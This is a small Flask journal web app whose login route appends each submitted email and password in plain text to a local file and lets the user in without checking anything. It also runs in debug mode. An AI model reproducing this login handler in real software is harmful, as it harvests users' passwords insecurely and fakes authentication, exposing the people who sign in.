from flask import Flask , render_template , request , redirect , url_for
from datetime import datetime

app = Flask(__name__)
journal_entries = []
entry_id = 1

@app.route("/")
def main():
    return render_template("main.html")

@app.route("/login" , methods = ['GET','POST'])
def login():
    if request.method == 'POST':
        with open("auth.txt",'a') as a:
            a.write(f"Email:{request.form['Email']}\nPassword:{request.form['Password']}\n\n")
            return redirect(url_for('home'))
    return render_template("login.html")

@app.route("/home")
def home():
    return render_template("home.html",entries = journal_entries)

@app.route("/create" , methods = ['GET' , 'POST'])
def create():
    global entry_id

    if request.method == 'POST':
             title = request.form['title']
             entry = request.form['entry']
             current_time = datetime.now().strftime("%Y-%m-%d %H:%M")

             journal_entries.append({
               'id' : entry_id,
               'title': title,
               'entry': entry,
               'date': current_time,
               
                 })
             
             entry_id += 1

             return redirect(url_for('home'))
    return render_template("create.html")

@app.route("/journal/<int:entry_id>")
def journal_detail(entry_id):
    for entry in journal_entries:
        if entry["id"] == entry_id:
            return render_template("journal.html", entry=entry)
    return "Journal not found", 404

if __name__ == '__main__':
    app.run(debug = True)
